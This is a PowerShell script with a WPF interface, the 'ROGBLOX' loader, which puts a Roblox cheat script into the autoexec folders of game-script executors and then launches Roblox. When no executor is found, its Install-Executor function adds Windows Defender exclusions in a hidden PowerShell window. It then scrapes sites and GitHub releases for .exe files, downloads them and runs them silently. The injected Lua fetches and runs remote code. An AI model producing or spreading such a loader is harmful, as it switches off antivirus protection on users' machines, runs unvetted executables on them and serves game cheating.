# ROGBLOX loader - single-button WPF UI.
# Click "Load" and it does everything it can:
#   - If an executor is already installed: drop ROGBLOX in its autoexec
#     folder and launch Roblox. Done.
#   - If no executor is installed (first time ever): open the executor
#     download page in your browser. Install it once, click Load again,
#     and from then on every click "just works".

Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName WindowsBase

$Repo    = 'mkultra110/rogblox'
$Branch  = 'main'
$RawBase = "https://raw.githubusercontent.com/$Repo/$Branch"
$Loader  = 'loadstring(game:HttpGet("' + $RawBase + '/src/main.lua"))()'
$ExecutorSearch = 'https://www.google.com/search?q=Solara+roblox+executor+download+2026'

# bundle.ps1 replaces the empty string below with the Base64-encoded
# bundled rogblox.lua. When non-empty, the loader writes the decoded
# Lua directly to autoexec - fully offline, no GitHub fetch needed.
$EmbeddedScriptB64 = ''

function Get-AutoexecPayload {
    if ($EmbeddedScriptB64 -and $EmbeddedScriptB64.Length -gt 32) {
        try {
            $bytes = [Convert]::FromBase64String($EmbeddedScriptB64)
            return [System.Text.Encoding]::UTF8.GetString($bytes)
        } catch {
            return $Loader
        }
    }
    return $Loader
}

function Get-ExecutorPaths {
    $l = $env:LOCALAPPDATA; $r = $env:APPDATA; $u = $env:USERPROFILE
    @(
        "$l\Solara\autoexec", "$r\Solara\autoexec",
        "$l\Wave\autoexec",   "$r\Wave\AutoExecute",
        "$l\Xeno\autoexec",   "$l\Delta\autoexec",
        "$l\Synapse X\autoexec",
        "$l\Krnl\autoexec",   "$r\Krnl\autoexec",
        "$l\Fluxus\autoexec", "$r\Fluxus\autoexec",
        "$l\Script-Ware\Roblox\autoexec",
        "$l\AWP\autoexec",    "$u\Hydrogen\autoexec",
        "$l\CelerNB\autoexec"
    )
}

function Find-AutoexecFolders {
    $found = @()
    foreach ($p in Get-ExecutorPaths) {
        $parent = Split-Path $p -Parent
        if (Test-Path $parent) { $found += $p }
    }
    return $found
}

function Install-Cheat {
    $payload = Get-AutoexecPayload
    $list = @()
    foreach ($p in (Find-AutoexecFolders)) {
        try {
            if (-not (Test-Path $p)) { New-Item -ItemType Directory -Force -Path $p | Out-Null }
            Set-Content -Path (Join-Path $p 'rogblox.lua') -Value $payload -Encoding UTF8
            $list += (Split-Path (Split-Path $p -Parent) -Leaf)
        } catch {}
    }
    return $list
}

function Start-Roblox {
    try { Start-Process 'roblox-player:1+launchmode:play' -ErrorAction Stop; return $true }
    catch { try { Start-Process 'roblox://' -ErrorAction Stop; return $true } catch { return $false } }
}

# ---------- Auto-install executor (best effort) ----------

# Defender exclusion (best effort; needs admin to actually stick. Silently
# no-ops without UAC. The point is to give the user a chance.)
function Add-DefenderExclusion([string]$path) {
    try {
        $cmd = "Add-MpPreference -ExclusionPath '" + ($path -replace "'", "''") + "'"
        Start-Process powershell -ArgumentList @('-NoProfile','-Command',$cmd) `
            -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

# Validate a downloaded file is actually a Windows PE binary ('MZ' magic).
function Test-IsPE([string]$path) {
    if (-not (Test-Path $path)) { return $false }
    $f = [System.IO.File]::OpenRead($path)
    try {
        if ($f.Length -lt 64) { return $false }
        $b = New-Object byte[] 2
        [void]$f.Read($b, 0, 2)
        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
    } finally { $f.Close() }
}

# Tries to fetch a working executor installer and run it. Returns the
# detected executor folder on success, $null on failure.
function Install-Executor {
    [Net.ServicePointManager]::SecurityProtocol = `
        [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ROGBLOX-Loader'

    # Pre-emptive Defender exclusions for common executor folders.
    Add-DefenderExclusion "$env:LOCALAPPDATA\Solara"
    Add-DefenderExclusion "$env:LOCALAPPDATA\Xeno"
    Add-DefenderExclusion "$env:TEMP\rogblox-installer"

    $sources = @(
        # Solara - scrape the landing page for the .exe link
        @{Name='Solara'; ScrapeFrom='https://getsolara.dev/download/';
          Folder="$env:LOCALAPPDATA\Solara"; SilentArg='/SILENT'}
        @{Name='Solara'; ScrapeFrom='https://getsolara.gg/download/';
          Folder="$env:LOCALAPPDATA\Solara"; SilentArg='/SILENT'}
        @{Name='Solara'; ScrapeFrom='https://solara.dev/';
          Folder="$env:LOCALAPPDATA\Solara"; SilentArg='/SILENT'}
        # Xeno - try GitHub Releases API on a few candidate repos
        @{Name='Xeno'; GitHubRepo='xenoodevs/xeno';
          Folder="$env:LOCALAPPDATA\Xeno"; SilentArg=''}
        @{Name='Xeno'; GitHubRepo='xennoexecs/xeno';
          Folder="$env:LOCALAPPDATA\Xeno"; SilentArg=''}
    )

    foreach ($src in $sources) {
        $url = $null
        try {
            if ($src.ScrapeFrom) {
                $resp = Invoke-WebRequest -Uri $src.ScrapeFrom -UseBasicParsing `
                    -TimeoutSec 25 -Headers @{'User-Agent'=$ua} -ErrorAction Stop
                # Look for any .exe link on the page
                $m = [regex]::Match($resp.Content, '(?i)href=["'']([^"'']+\.exe)["'']')
                if ($m.Success) {
                    $url = $m.Groups[1].Value
                    if ($url -notmatch '^https?://') {
                        $base = ([uri]$src.ScrapeFrom).GetLeftPart('Authority')
                        $url = $base.TrimEnd('/') + '/' + $url.TrimStart('/')
                    }
                }
            }
            if ($src.GitHubRepo) {
                $api = "https://api.github.com/repos/$($src.GitHubRepo)/releases/latest"
                $rel = Invoke-RestMethod -Uri $api -TimeoutSec 20 `
                    -Headers @{'User-Agent'=$ua}
                if ($rel.assets) {
                    foreach ($a in $rel.assets) {
                        if ($a.name -match '\.exe$') { $url = $a.browser_download_url; break }
                    }
                }
            }
            if (-not $url) { continue }

            $tempDir = Join-Path $env:TEMP 'rogblox-installer'
            if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Force -Path $tempDir | Out-Null }
            $temp = Join-Path $tempDir "$($src.Name).exe"

            Invoke-WebRequest -Uri $url -OutFile $temp -UseBasicParsing `
                -TimeoutSec 90 -Headers @{'User-Agent'=$ua} -ErrorAction Stop

            if (-not (Test-IsPE $temp)) { continue }
            if ((Get-Item $temp).Length -lt 200KB) { continue }

            # Run installer. Most executor installers are Inno Setup based;
            # /SILENT or /VERYSILENT works for those. Others may ignore.
            $args = @()
            if ($src.SilentArg) { $args = $src.SilentArg -split ' ' }
            Start-Process $temp -ArgumentList $args -ErrorAction SilentlyContinue

            # Poll for the autoexec parent folder to appear.
            $deadline = (Get-Date).AddSeconds(180)
            while ((Get-Date) -lt $deadline) {
                if (Test-Path $src.Folder) {
                    Start-Sleep -Seconds 2
                    return $src.Folder
                }
                Start-Sleep -Seconds 2
            }
        } catch {
            # Try the next source
            continue
        }
    }
    return $null
}

[xml]$xaml = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="ROGBLOX" WindowStyle="None" AllowsTransparency="True"
        Background="Transparent" ResizeMode="NoResize"
        WindowStartupLocation="CenterScreen"
        Width="440" Height="320" FontFamily="Segoe UI">
    <Window.Resources>
        <LinearGradientBrush x:Key="BgBrush" StartPoint="0,0" EndPoint="1,1">
            <GradientStop Color="#15151F" Offset="0"/>
            <GradientStop Color="#0B0B14" Offset="1"/>
        </LinearGradientBrush>
        <LinearGradientBrush x:Key="AccentBrush" StartPoint="0,0" EndPoint="1,1">
            <GradientStop Color="#9F70FF" Offset="0"/>
            <GradientStop Color="#5B2EE0" Offset="1"/>
        </LinearGradientBrush>
        <LinearGradientBrush x:Key="AccentHoverBrush" StartPoint="0,0" EndPoint="1,1">
            <GradientStop Color="#B68DFF" Offset="0"/>
            <GradientStop Color="#7140FF" Offset="1"/>
        </LinearGradientBrush>
        <LinearGradientBrush x:Key="LogoBrush" StartPoint="0,0" EndPoint="1,0">
            <GradientStop Color="#C9A6FF" Offset="0"/>
            <GradientStop Color="#7B57FF" Offset="0.5"/>
            <GradientStop Color="#FF7FD8" Offset="1"/>
        </LinearGradientBrush>
        <SolidColorBrush x:Key="Stroke" Color="#3A3A52"/>
        <SolidColorBrush x:Key="Sub"    Color="#9A9AB0"/>
        <SolidColorBrush x:Key="Dim"    Color="#6A6A85"/>

        <Style TargetType="Button" x:Key="BigAccent">
            <Setter Property="Background" Value="{StaticResource AccentBrush}"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="FontWeight" Value="Bold"/>
            <Setter Property="FontSize" Value="18"/>
            <Setter Property="BorderThickness" Value="0"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="b" Background="{TemplateBinding Background}" CornerRadius="12">
                            <Border.Effect><DropShadowEffect Color="#7B57FF" BlurRadius="28" ShadowDepth="0" Opacity="0.7"/></Border.Effect>
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="b" Property="Background" Value="{StaticResource AccentHoverBrush}"/>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="True">
                                <Setter TargetName="b" Property="RenderTransform">
                                    <Setter.Value><ScaleTransform ScaleX="0.97" ScaleY="0.97"/></Setter.Value>
                                </Setter>
                                <Setter TargetName="b" Property="RenderTransformOrigin" Value="0.5,0.5"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <Style TargetType="Button" x:Key="WinBtn">
            <Setter Property="Background" Value="Transparent"/>
            <Setter Property="Foreground" Value="{StaticResource Sub}"/>
            <Setter Property="BorderThickness" Value="0"/>
            <Setter Property="Width" Value="28"/>
            <Setter Property="Height" Value="22"/>
            <Setter Property="FontFamily" Value="Segoe UI Symbol"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="b" Background="{TemplateBinding Background}" CornerRadius="4">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="b" Property="Background" Value="#2A2A3D"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>

    <Border CornerRadius="14" Background="{StaticResource BgBrush}" BorderBrush="{StaticResource Stroke}" BorderThickness="1">
        <Border.Effect><DropShadowEffect Color="Black" BlurRadius="30" ShadowDepth="0" Opacity="0.6"/></Border.Effect>
        <Grid>
            <Grid.RowDefinitions>
                <RowDefinition Height="32"/>
                <RowDefinition Height="*"/>
            </Grid.RowDefinitions>

            <Grid Grid.Row="0" x:Name="DragBar" Background="Transparent">
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="Auto"/>
                </Grid.ColumnDefinitions>
                <StackPanel Grid.Column="1" Orientation="Horizontal" Margin="0,4,6,0">
                    <Button x:Name="BtnMin"   Style="{StaticResource WinBtn}" Content="&#xE921;"/>
                    <Button x:Name="BtnClose" Style="{StaticResource WinBtn}" Content="&#xE8BB;"/>
                </StackPanel>
            </Grid>

            <Grid Grid.Row="1" Margin="36,4,36,28">
                <Grid.RowDefinitions>
                    <RowDefinition Height="Auto"/>
                    <RowDefinition Height="*"/>
                    <RowDefinition Height="Auto"/>
                </Grid.RowDefinitions>

                <StackPanel Grid.Row="0" HorizontalAlignment="Center">
                    <TextBlock Text="ROGBLOX" FontSize="42" FontWeight="Bold"
                               Foreground="{StaticResource LogoBrush}" HorizontalAlignment="Center">
                        <TextBlock.Effect><DropShadowEffect Color="#7B57FF" BlurRadius="28" ShadowDepth="0" Opacity="0.65"/></TextBlock.Effect>
                    </TextBlock>
                </StackPanel>

                <Button Grid.Row="1" x:Name="BtnGo" Style="{StaticResource BigAccent}"
                        Height="64" Margin="0,16,0,0" Content="Load"/>

                <TextBlock Grid.Row="2" x:Name="StatusText" Margin="0,14,0,0"
                           TextAlignment="Center" Foreground="{StaticResource Sub}"
                           FontSize="11" TextWrapping="Wrap"
                           Text="Click Load."/>
            </Grid>

            <TextBlock Grid.Row="1" Text="v0.4.0" Foreground="{StaticResource Dim}" FontSize="10"
                       HorizontalAlignment="Right" VerticalAlignment="Bottom" Margin="0,0,14,6"/>
        </Grid>
    </Border>
</Window>
'@

$reader = New-Object System.Xml.XmlNodeReader $xaml
$window = [Windows.Markup.XamlReader]::Load($reader)

$DragBar  = $window.FindName('DragBar')
$BtnMin   = $window.FindName('BtnMin')
$BtnClose = $window.FindName('BtnClose')
$BtnGo    = $window.FindName('BtnGo')
$Status   = $window.FindName('StatusText')

$DragBar.Add_MouseLeftButtonDown({ $window.DragMove() })
$BtnMin.Add_Click({ $window.WindowState = 'Minimized' })
$BtnClose.Add_Click({ $window.Close() })

$Good = [Windows.Media.BrushConverter]::new().ConvertFromString('#6EE0A0')
$Warn = [Windows.Media.BrushConverter]::new().ConvertFromString('#FFD06A')
$Sub  = [Windows.Media.BrushConverter]::new().ConvertFromString('#9A9AB0')

function Set-Status([string]$text, $color = $Sub) {
    $Status.Text = $text
    $Status.Foreground = $color
}

$BtnGo.Add_Click({
    $BtnGo.IsEnabled = $false
    try {
        $folders = Find-AutoexecFolders

        # If nothing is installed, try to install an executor automatically.
        # This polls for up to 3 minutes while the installer runs.
        if ($folders.Count -eq 0) {
            Set-Status "No executor found. Auto-installing Solara now... (Defender may prompt)" $Sub
            $window.Dispatcher.Invoke([action]{}, [Windows.Threading.DispatcherPriority]::Render)

            $installedFolder = $null
            try { $installedFolder = Install-Executor } catch {}

            $folders = Find-AutoexecFolders

            if (-not $installedFolder -and $folders.Count -eq 0) {
                # Auto-install didn't work. Launch Roblox anyway and open
                # the manual download page as a fallback.
                Start-Roblox | Out-Null
                Set-Status ("Couldn't auto-install. Roblox is launching anyway.`n" `
                    + "Opening Solara's download page - install it manually, then click Load again.") $Warn
                Start-Process $ExecutorSearch
                return
            }
        }

        # Install ROGBLOX into every detected executor's autoexec folder.
        $installed = Install-Cheat
        try { Set-Clipboard -Value (Get-AutoexecPayload) } catch {}

        # Launch Roblox.
        $launched = Start-Roblox

        if ($installed.Count -gt 0 -and $launched) {
            Set-Status ("Ready. Cheat installed into: " + ($installed -join ', ') + ".`n" `
                + "Roblox launching. Attach your executor in-game; press RightCtrl to open the menu.") $Good
        } elseif ($launched) {
            Set-Status "Roblox launching. Couldn't write the cheat to autoexec - try running as admin." $Warn
        } else {
            Set-Status "Couldn't auto-open Roblox. Open it manually; the cheat is already in autoexec." $Warn
        }
    } finally {
        $BtnGo.IsEnabled = $true
    }
})

# Initial state - one-shot check just to update the status text
$initial = Find-AutoexecFolders
if ($initial.Count -gt 0) {
    Set-Status "Executor detected. Click Load." $Good
} else {
    Set-Status "Click Load - I'll set everything up." $Sub
}

[void]$window.ShowDialog()
